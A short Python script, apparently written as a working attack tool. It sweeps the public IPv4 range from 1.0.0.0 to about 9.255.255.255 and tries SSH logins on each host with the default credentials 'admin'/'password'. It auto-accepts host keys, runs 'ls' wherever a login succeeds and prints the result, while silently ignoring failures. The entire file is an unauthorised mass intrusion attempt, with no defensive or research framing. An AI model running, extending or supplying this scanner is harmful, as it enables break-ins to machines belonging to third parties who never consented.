import paramiko
import ipaddress

def ssh_conect(ip, user, passwd, cmd):
    client = paramiko.SSHClient()
#host_keyを自動的に保存する.
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    client.connect(ip, username=user, password=passwd, port=22, timeout=5.0)
    
    stdin,stdout,stderr = client.exec_command(cmd)
    outlines = stdout.readlines()
    resp=''.join(outlines)
    print(resp)
    return

#1.0.0.0 ～ 9.255.255.255
for i in range(16777216,167772159):
    ip = str(ipaddress.IPv4Address(i))
    usr = 'admin'
    passwd = 'password'
    cmd = 'ls'
    try:
        ssh_conect(ip, usr, passwd, cmd)
    except:
        pass
